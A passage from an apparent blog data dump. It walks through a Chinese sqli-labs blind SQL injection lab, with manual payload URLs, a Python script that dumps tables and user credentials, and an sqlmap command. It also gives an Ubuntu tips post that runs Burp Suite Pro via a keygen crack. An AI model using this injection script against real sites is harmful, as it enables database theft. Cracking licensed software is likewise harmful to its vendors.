column_numlist)\n\n#猜解列长度\nprint(&quot;猜解列长度....&quot;)\nfor i in range(column_numlist[3]):\n    column_len = 0 #列名长度\n     #获取列长度\n    for j in range(1, 21):\n        db_payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))--+&quot; % (i, j)\n        #print(url + db_payload)\n        r = requests.get(url + db_payload)\n        if &quot;You are in&quot; not in r.text:\n            column_len = j - 1\n            break\n    column_lenlist.append(column_len)\nprint(&apos;user列名长度：&apos;, column_lenlist)\n\n#猜解列名\nprint(&quot;猜解列名....&quot;)\nfor i in range(column_numlist[3]):\n    column_names = &apos;&apos;\n    for j in range(1,column_lenlist[i]+1):\n        for k in range(left, right):\n            db_payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))=%d--+&quot; % (\n                i, j, k)\n            #print(url + db_payload)\n            r = requests.get(url + db_payload)\n            if &quot;You are in&quot; in r.text:\n                column_names += chr(k)\n                print(&quot;当前表名猜解：&quot;, column_names)\n                break\n    column_namelist.append(column_names)\nprint(&quot;users列名:\\n[+]&quot;, column_namelist)\n\n#爆破字段\nprint(&quot;爆破字段....&quot;)\nprint(&apos;开始爆破字段数量：&apos;)\nfor column in column_namelist[0:]:\n    #print(column, &apos;：&apos;)\n    dump_num = 0\n    #爆破各个字段数量\n    for i in range(30):\n        db_payload = &quot;&apos; and %d=(select count(%s) from %s.%s)--+&quot; % (i, column, db_name, table_namelist[-1])\n        #print(url+db_payload)\n        r = requests.get(url+db_payload)\n        if &quot;You are in&quot; in r.text:\n            dump_num = i\n            #print(i)\n            break\n    dump_numlist.append(dump_num)\nprint(&apos;字段数：&apos;, dump_numlist)\n\nprint(&apos;开始爆破字段：&apos;)\nfor i in range(len(dump_numlist)):\n    print(column_namelist[i]+&quot;:&quot;)\n    #####字段个数####\n    for j in range(dump_numlist[i]):\n        dump_len = 0\n        dump_name = &apos;&apos;\n        ### 字段长度 ####\n        for k in range(1, 21):\n            db_payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&quot; % (\n                column_namelist[i], db_name, table_namelist[-1], j, k)\n            r = requests.get(url + db_payload)\n            #print(url + db_payload)\n            if &quot;You are in&quot; not in r.text:\n                dump_len = k - 1\n                break\n        #print(dump_len)\n        for l in range(1, dump_len + 1):\n            for m in range(32, 127):\n                db_payload = &quot;&apos;and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&quot;  % (\n                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n                #print(url + db_payload)\n                r = requests.get(url + db_payload)\n                if &quot;You are in&quot; in r.text:\n                    dump_name += chr(m)\n                    break\n        print(&apos;[+]&apos;, dump_name)</code></pre><h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>跟Lesson-1的过程没有什么大的区别。详细过程可以查看如下。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n\n<p>清除session</p>\n<p>–flush-session  –fresh-queries</p>\n<p><code>sqlmap -u http://10.60.250.151/sqlilabs/Less-8/?id=1 --dbs --technique B --threads 10 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-8/3.png\" alt=\"3\"></p>\n<p>直接上结果了。</p>\n<p><img src=\"/img/sql/Lesson-8/2.png\" alt=\"2\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-8-GET单引号布尔型盲注\"><a href=\"#sqli-labs-lession-8-GET单引号布尔型盲注\" class=\"headerlink\" title=\"sqli-labs-lession 8 GET单引号布尔型盲注\"></a>sqli-labs-lession 8 GET单引号布尔型盲注</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-8/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"注入点\"><a href=\"#注入点\" class=\"headerlink\" title=\"注入点\"></a>注入点</h3><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-8/4.png\" alt=\"4\"></p>\n<p>没有信息显示,但是页面改变了</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39;%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/5.png\" alt=\"5\"></p>\n<p>判断为单引号闭合</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; order by 3%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/6.png\" alt=\"6\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/7.png\" alt=\"7\"></p>\n<p><code>order by 3</code>出现<code>You are in</code>,<code>order by 4</code>没有,确认字段数为3。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><h4 id=\"获取数据库名长度\"><a href=\"#获取数据库名长度\" class=\"headerlink\" title=\"获取数据库名长度\"></a>获取数据库名长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 8=length(database())%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/8.png\" alt=\"8\"></p>\n<h4 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h4><p>left(str,n):截取字段<code>str</code>左侧的n个字符。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and &#39;s&#39;=left(database(),1)%23</code></p>\n<p>返回正确页面,确认第一个字符是<code>s</code></p>\n<p><img src=\"/img/sql/Lesson-8/9.png\" alt=\"9\"></p>\n<pre><code>中间都是同样的确认过程...</code></pre><p>这样手动确认,直到数据库名长度测完(十分费力…),下面是最终结果</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and &#39;security&#39;=left(database(),8)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/10.png\" alt=\"10\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><h4 id=\"获取表数\"><a href=\"#获取表数\" class=\"headerlink\" title=\"获取表数\"></a>获取表数</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/11.png\" alt=\"11\"></p>\n<h4 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h4><p>采用二分法。</p>\n<p>以下返回<code>You are in</code>表示<code>True</code>,无返回表示<code>Flase</code></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 95&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>95:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 109&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>109:Flase</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 102&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>102:Flase</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 98&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>98:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 100&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>100:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 101&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>101:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 101=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/12.png\" alt=\"12\"></p>\n<p>确定ascii码值为101,对应的字符为<code>e</code>。</p>\n<p>接下来用二分法判断第一个表的第二个字符。</p>\n<p>最终能测试出存在下面几张表:</p>\n<ul>\n<li>emails</li>\n<li>referers</li>\n<li>uagents</li>\n<li>users</li>\n</ul>\n<h3 id=\"获取列\"><a href=\"#获取列\" class=\"headerlink\" title=\"获取列\"></a>获取列</h3><h4 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h4><p>对感兴趣的表获取列数,以users为例。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 3=(select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/13.png\" alt=\"13\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=(select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/14.png\" alt=\"14\"></p>\n<p>根据上面两张图可以发现<code>users</code>的列数有3个。</p>\n<h4 id=\"获取列长度\"><a href=\"#获取列长度\" class=\"headerlink\" title=\"获取列长度\"></a>获取列长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 2=length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/15.png\" alt=\"15\"></p>\n<p>说明<code>users</code>表中第一列长度为2。</p>\n<p>可以测试出总共3列长度分别为:2,8,8。</p>\n<h4 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h4><p>采用二分法。</p>\n<p>以下返回<code>You are in</code>表示<code>True</code>,无返回表示<code>Flase</code></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 95&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>95:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 109&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>109:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 102&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>102:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 106&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>106:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 104&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>104:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 105&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>105:True</p>\n<p>确定ascii码值为105,对应的字符为<code>i</code>。因为上面查出的列长度为2,再测试第一列的的第二个字符就可以了,还是用二分法查第二个字符。</p>\n<p>直接上结果:</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 100=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),2,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/16.png\" alt=\"16\"></p>\n<p>ascii码值为100,对应的字符为<code>d</code>,第一列为<code>id</code>,同理可以获取到其他两列为<code>username</code>, <code>password</code>。</p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p>获取字段也和上面的大同小异了,直接给结果。</p>\n<p>也是获取字段数量-&gt;获取字段长度-&gt;获取字段名的流程。</p>\n<h4 id=\"获取字段数量\"><a href=\"#获取字段数量\" class=\"headerlink\" title=\"获取字段数量\"></a>获取字段数量</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 13=(select count(username) from security.users)%23</code></p>\n<p>字段数是13。</p>\n<p><img src=\"/img/sql/Lesson-8/17.png\" alt=\"17\"></p>\n<h4 id=\"获取字段长度\"><a href=\"#获取字段长度\" class=\"headerlink\" title=\"获取字段长度\"></a>获取字段长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=length((select username from security.users limit 0,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/18.png\" alt=\"18\"></p>\n<h4 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 68=ascii(substr((select username from security.users limit 0,1),1,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/19.png\" alt=\"19\"></p>\n<p>ascii码值为68,对应的字符为<code>D</code>,第一个账户的第一个字母是<code>D</code>。</p>\n<p>可以发现上述过程很多都是重复的,可以写个脚本运行。</p>\n<h3 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h3><p>用Python写的一个爆破脚本,没有用二分法,也没封装起来,力度垃圾,凑合着用。</p>\n<p>脚本运行结果:</p>\n<p><img src=\"/img/sql/Lesson-8/20.png\" alt=\"20\"></p>\n<p><img src=\"/img/sql/Lesson-8/21.png\" alt=\"21\"></p>\n<pre><code>import requests\ndb_name = &apos;&apos;#&apos;&apos;security&apos;#数据库名\ndb_len = 0 #当前数据库长度\ntable_num = 0#数据库表数目\ntable_names = &apos;&apos; #数据表名\ntable_lenlist = [] #数据表名长度列表\ntable_namelist = [] #数据表名列表\ncolumn_numlist = [] #数据表列数\ncolumn_lenlist = [] #列名长度列表\ncolumn_namelist = [] #列名列表\ndump_numlist = []#字段数量列表\nurl = &apos;http://10.60.250.151/sqlilabs/Less-8/?id=1&apos;\ndb_payload = &apos;&apos;\ni = j = k = l = m = 0\n\nleft = 97\nright = 123\n\n#查询当前数据库长度\nprint(&quot;查询当前数据库长度。。。&quot;)\nfor i in range(1, 21):\n    db_payload = &quot;&apos; and %d=(select length(database()))--+&quot; % i\n    r = requests.get(url+db_payload)\n    if &quot;You are in&quot; in r.text:\n        db_len = i\n        break\nprint(&quot;当前数据库长度为&quot;, db_len)\n\n#暴破当前数据库名\nprint(&quot;暴破当前数据库名...&quot;)\n#数据库名长度\nfor i in range(1, db_len+1):\n    #爆破字段区域\n    for j in range(left, right):\n        db_payload = &quot;&apos; and (left(database(), %d))=&apos;%s&apos;--+&quot; % (i, db_name+chr(j))\n        #print(url+db_payload)\n        r = requests.get(url+db_payload)\n        if &quot;You are in&quot; in r.text:\n            db_name += chr(j)\n            print(&apos;当前数据库名猜解：&apos;+db_name)\n            break\nprint(&quot;当前数据库名:\\n[+]&quot;, db_name)\n\n#数据库中表数目\nprint(&quot;当前数据库表数目....&quot;)\nfor i in range(1,100):\n    db_payload = &quot;&apos; and %d=(select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)--+&quot; % (i, db_name)\n    #print(url+db_payload)\n    r = requests.get(url+db_payload)\n    if &quot;You are in&quot; in r.text:\n        table_num = i\n        break\nprint(&quot;当前数据库表数目:&quot;, table_num)\n\n#数据库中表长度\nprint(&quot;当前数据库表名长度....&quot;)\nfor i in range(table_num):\n    table_len = 0 #表名长度\n    #获取数据表长度\n    for j in range(1, 21):\n        db_payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))--+&quot; % (db_name, i, j)\n        #print(url + db_payload)\n        r = requests.get(url + db_payload)\n        if &quot;You are in&quot; not in r.text:\n            table_len = j - 1\n            table_lenlist.append(table_len)\n            break\nprint(&apos;表名长度：&apos;, table_lenlist)\n\n#数据库表名\nfor i in range(table_num):\n    # 获取数据表名\n    table_names = &apos;&apos;\n    for j in range(1, table_lenlist[i]+1):\n        for k in range(left, right):\n            db_payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))=%d--+&quot; % (db_name, i, j, k)\n            #print(url+db_payload)\n            r = requests.get(url+db_payload)\n            if &quot;You are in&quot; in r.text:\n                table_names += chr(k)\n                print(&quot;当前表名猜解：&quot;, table_names)\n                break\n    table_namelist.append(table_names)\nprint(&quot;当前数据表名:\\n[+]&quot;, table_namelist)\n\n#数据列数\nprint(&quot;各个数据表列数...&quot;)\nfor i in range(table_num):\n    #print(i)\n    column_num = 0\n    for j in range(1, 21):\n        db_payload = &quot;&apos; and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos;)--+&quot; % (j, table_namelist[i])\n        #print(url + db_payload)\n        r = requests.get(url+db_payload)\n        if &quot;You are in&quot; in r.text:\n            column_num = j\n            #print(&quot;[+]&quot;+table_namelist[i]+&quot;表列数:&quot;+ str(column_num))\n            column_numlist.append(column_num)\n            break\nprint(&quot;[+]数据表列数&quot;, column_numlist)\n\n#猜解列长度\nprint(&quot;猜解列长度....&quot;)\nfor i in range(column_numlist[3]):\n    column_len = 0 #列名长度\n     #获取列长度\n    for j in range(1, 21):\n        db_payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))--+&quot; % (i, j)\n        #print(url + db_payload)\n        r = requests.get(url + db_payload)\n        if &quot;You are in&quot; not in r.text:\n            column_len = j - 1\n            break\n    column_lenlist.append(column_len)\nprint(&apos;user列名长度：&apos;, column_lenlist)\n\n#猜解列名\nprint(&quot;猜解列名....&quot;)\nfor i in range(column_numlist[3]):\n    column_names = &apos;&apos;\n    for j in range(1,column_lenlist[i]+1):\n        for k in range(left, right):\n            db_payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))=%d--+&quot; % (\n                i, j, k)\n            #print(url + db_payload)\n            r = requests.get(url + db_payload)\n            if &quot;You are in&quot; in r.text:\n                column_names += chr(k)\n                print(&quot;当前表名猜解：&quot;, column_names)\n                break\n    column_namelist.append(column_names)\nprint(&quot;users列名:\\n[+]&quot;, column_namelist)\n\n#爆破字段\nprint(&quot;爆破字段....&quot;)\nprint(&apos;开始爆破字段数量：&apos;)\nfor column in column_namelist[0:]:\n    #print(column, &apos;：&apos;)\n    dump_num = 0\n    #爆破各个字段数量\n    for i in range(30):\n        db_payload = &quot;&apos; and %d=(select count(%s) from %s.%s)--+&quot; % (i, column, db_name, table_namelist[-1])\n        #print(url+db_payload)\n        r = requests.get(url+db_payload)\n        if &quot;You are in&quot; in r.text:\n            dump_num = i\n            #print(i)\n            break\n    dump_numlist.append(dump_num)\nprint(&apos;字段数：&apos;, dump_numlist)\n\nprint(&apos;开始爆破字段：&apos;)\nfor i in range(len(dump_numlist)):\n    print(column_namelist[i]+&quot;:&quot;)\n    #####字段个数####\n    for j in range(dump_numlist[i]):\n        dump_len = 0\n        dump_name = &apos;&apos;\n        ### 字段长度 ####\n        for k in range(1, 21):\n            db_payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&quot; % (\n                column_namelist[i], db_name, table_namelist[-1], j, k)\n            r = requests.get(url + db_payload)\n            #print(url + db_payload)\n            if &quot;You are in&quot; not in r.text:\n                dump_len = k - 1\n                break\n        #print(dump_len)\n        for l in range(1, dump_len + 1):\n            for m in range(32, 127):\n                db_payload = &quot;&apos;and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&quot;  % (\n                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n                #print(url + db_payload)\n                r = requests.get(url + db_payload)\n                if &quot;You are in&quot; in r.text:\n                    dump_name += chr(m)\n                    break\n        print(&apos;[+]&apos;, dump_name)</code></pre><h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>跟Lesson-1的过程没有什么大的区别。详细过程可以查看如下。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n\n<p>清除session</p>\n<p>–flush-session  –fresh-queries</p>\n<p><code>sqlmap -u http://10.60.250.151/sqlilabs/Less-8/?id=1 --dbs --technique B --threads 10 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-8/3.png\" alt=\"3\"></p>\n<p>直接上结果了。</p>\n<p><img src=\"/img/sql/Lesson-8/2.png\" alt=\"2\"></p>\n"},{"title":"ubuntn踩坑手册","date":"2018-10-01T07:07:48.000Z","_content":"\n# ubuntn踩坑手册\n\n------\n\n## 目录\n\n1. [安装主题后Ctrl+Alt+T 终端快捷方式无效](#001 )\n2. [安装burpsuite](#002)\n3. [安装有道词典](#003)\n4. [截图工具 Shutter](#004)\n5. [安装DeepinScrot](#005)\n6. [Ubuntu18.04双击网易云音乐无法启动](#006)\n7. [Ubuntu18.04设置合上盖子时不进入休眠](#007)\n\n<span id=\"001\"></span>\n\n## 安装主题后Ctrl+Alt+T 终端快捷方式无效\n\n解决方案:手动添加快捷方式。\n\n<span id=\"002\"></span>\n## Ubuntu中安装burpsuite\n\n[参考文章(鸣谢)：一纸笔墨-Ubuntu中安装burp suite](https://www.jianshu.com/p/3e7bb41a1464)\n\n### 安装java环境\n\njava 8 下载地址：\n\nhttps://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html\n\n选择`jdk-8u181-linux-x64.tar.gz`(当前最新的64版本,32位下载对应版本)。\n\n下载完成后,以root用户进入下载目录,将下载到的`jdk-8u181-linux-x64.tar.gz`解压:`tar zxvf jdk-8u181-linux-x64.tar.gz`\n\n将解压的得到的`jdk1.8.0_181`文件夹复制到/opt目录:`mv jdk1.8.0_181 /opt/`\n\n> /opt目录用来安装附加软件包，是用户级的程序目录，可以理解为D:/Software。安装到/opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。opt有可选的意思，这里可以用于放置第三方大型软件（或游戏），当你不需要时，直接rm -rf 掉即可。在硬盘容量不够时，也可将/opt单独挂载到其他磁盘上使用。\n\n进入/bin目录(`cd /bin`)，并在/bin目录下创建java软链接：`ln -s /opt/jdk1.8.0_181/bin/java java`\n\n> bin为binary的简写，/bin目录主要放置系统的必备执行文件，例如: cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。\n\n在/bin目录创建了一个Java的软链接使我们都能使用Java。\n\n> ln是linux中又一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接.当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。\n>\n> -s 软链接(符号链接)\n>\n> 软链接：\n>\n> 1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n>\n> 2.软链接可以 跨文件系统 ，硬链接不可以\n>\n> 3.软链接可以对一个不存在的文件名进行链接\n>\n> 4.软链接可以对目录进行链接\n\n进入/etc目录,修改/etc/profile文件，在文件末尾加上四行：\n\n`export JAVA_HOME=/opt/jdk1.8.0_112`#注意版本\n\n`export JRE_HOME=${JAVA_HOME}/jre`\n\n`export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib`\n\n`export PATH={JAVA_HOME}/bin:$PATH`\n\n> /etc/profile文件用于修改环境变量，在这里修改的内容是对所有用户起作用的\n\n最后使用命令`source /etc/profile`重新执行文件使环境变量生效，之后输入`echo $JAVA_HOME`，如果出现`/opt/jdk1.8.0_181`则说明安装应该是成功了。\n\n### 安装burpsuite\n\n从52pojie下载burpsuite,将解压得到的burp-loader-keygen.jar和burpsuite_pro_v1.7.37.jar文件移动到`/opt/burpsuite`(没有就创建一个)。在该目录下用`sudo java -jar burp-loader-keygen.jar`来运行注册机,用注册机登录。但是这样不方便,有以下解决方案。\n\n> **/usr/bin**　是在后期安装的一些软件的运行脚本\n\n```\ncd /opt/burpsuite\nsudo +x burp-loader-keygen.jar burpsuite_pro_v1.7.37.jar \nsudo vim /usr/bin/burpsuite\n    #!/bin/bash\n    java -Xbootclasspath/p:/opt/burpsuite/burp-loader-keygen.jar -jar /opt/burpsuite/burpsuite_pro_v1.7.37.jar\n\nsudo chmod +x /usr/bin/burpsuite\n```\n\n之后就可以直接输入`sudo burpsuite`就可以运行了。\n\n<span id=\"003\"></span>\n## 安装有道词典\n\nhttps://github.com/yomun/youdaodict_5.5\n\n### 有道词典 v1.1.1 ( 支持 PyQt 5.5 或以上 )\n\n这个有道词典是从 Deepin 15.4.1 (youdao-dict_1.0.8-1_amd64.deb) 取出, 然后重新打包成 Ubuntu 能用的 deb 安装包\n它支持 Ubuntu 16.10 / Fedora 24 / OpenSUSE 42.2 等开始的 Linux 分发版\n\n<http://packages.deepin.com/deepin/pool/main/y/youdao-dict/>\n\n1. 取得有道词典安装包 (需要3D加速, 假设显卡驱动已安装了)\n\n```\nwget https://github.com/yomun/youdaodict_5.5/raw/master/youdao-dict_1.1.1-0~ubuntu_amd64.deb\n```\n\n1. 如有 pip3 安装的 PyQt5, 卸载之.. (5.6 开始的版本, 因它缺所需旧模块)\n\n```\n如有显示 PyQt5 (5.10.1), 卸载之..\n$ pip3 list | grep PyQt5\n$ pip3 uninstall pyqt5\n\nroot 户口也一样要\n$ sudo pip3 list | grep PyQt5\n$ sudo pip3 uninstall pyqt5\n```\n\n1. 安装依赖软件包\n\n- Ubuntu 16.04 - 18.04 / Debian 9.1 / Linux Mint 18.2 / Zorin OS 12.1\n\n```\nsudo su\n$ apt install python3\n\n$ apt install python3-dbus python3-lxml python3-pil python3-requests python3-xdg python3-xlib\n$ apt-get install -f -y\n$ apt install python3-pyqt5 python3-pyqt5.qtmultimedia python3-pyqt5.qtquick python3-pyqt5.qtwebkit\n\n$ apt install gir1.2-appindicator3-0.1 qml-module-qtgraphicaleffects qml-module-qtquick-controls\n$ apt install libqt5multimedia5-plugins ttf-wqy-microhei\n$ apt install tesseract-ocr tesseract-ocr-eng tesseract-ocr-chi-sim tesseract-ocr-chi-tra\n\n$ apt install ubuntu-restricted-extras\n\n我这里python3-lxml没安装上,单独来一次。\n$ apt-get install python3-lxml\n$ dpkg -i youdao-dict_1.1.1-0~ubuntu_amd64.deb\n上面的没问题到这步就成功了。\nUbuntu 18.04 用 fonts-wqy-microhei 取代了 ttf-wqy-microhei\n```\n<span id=\"004\"></span>\n## 截图工具Shutter\n\nubuntu 安装截图工具 Shutter，并设置快捷键 Ctrl+Alt+A\n\n### 安装截图工具 Shutter\n\n```\n$ sudo apt-get install shutter\n```\n\n### 设置 Shutter 截屏快捷键 [ctrl + Alt + A]\n\n1. Ubuntu右上角右键 - 打开系统设置 - 打开键盘 - 点击快捷键 - 自定义快捷键\n2. 点击 + 号， 添加快捷键。 名称随便命名，如 shutter select, 命令 设置为 shutter -s \n   点击应用 - 点击 Disabled - 然后迅速按下 ctrl + alt + a\n\n<span id=\"005\"></span>\n\n## 安装DeepinScrot\n\nDeepinScrot : 这是一个在深度(Deepin)操作系统中使用的截图工具。 \n深度操作系统是中国国产的基于Linux的操作系统, 界面还蛮清新的, 由武汉深之度科技有限公司研发。\n\nDeepinScrot截图工具类似于QQ,适合国人。\n\n### 安装\n\n```\nwget http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb\nsudo dpkg -i deepin-scrot_2.0-0deepin_all.deb \nsudo apt-get install -f\n#重新\nsudo dpkg -i deepin-scrot_2.0-0deepin_all.deb \n#安装成功\n```\n\n### 使用DeepinScrot\n\n```\ndeepin-scrot \n```\n\n### 设置DeepinScrot快捷键\n\n　 ubuntu 设置-键盘－自定义快捷键 \n　 填写名称，命令(deepin-scrot)，快捷键 \n\n<span id=\"006\"></span>\n\n## Ubuntu18.04双击网易云音乐无法启动\n\n解决方案来自知乎。\n\nUbuntu 18.04 装了网易云音乐，难道只能用 sudo 启动吗？ - Fancy的回答 - 知乎\nhttps://www.zhihu.com/question/277330447/answer/478510195\n\n### 问题描述\n\n只能在命令行下用`sudo netease-cloud-music`启动网易云音乐,双击网易云音乐无法启动。\n\n### 问题产生原因\n\n双击图标无法启动是因为环境变量 SESSION_MANAGER在捣乱。sudo后该环境变量变为了空。\n\n```\n#输出为空\nsudo env|grep SESSION_MANAGER\n#有输出 \nenv|grep SESSION_MANAGER\n```\n\n### 解决方案\n\n```\n# 对应行修改为 Exec=sh -c \"unset SESSION_MANAGER && netease-cloud-music %U\" \nsudo vim /usr/share/applications/netease-cloud-music.desktop\n# 修改Exec=\nsh -c \"unset SESSION_MANAGER && netease-cloud-music\"\n```\n\n![006_1](/img/UbuntuPro/006_1.png)\n\n保存并退出后即可双击打开网易云音乐。\n\n<span id=\"007\"></span>\n\n## Ubuntu18.04设置合上盖子时不进入休眠\n\n### 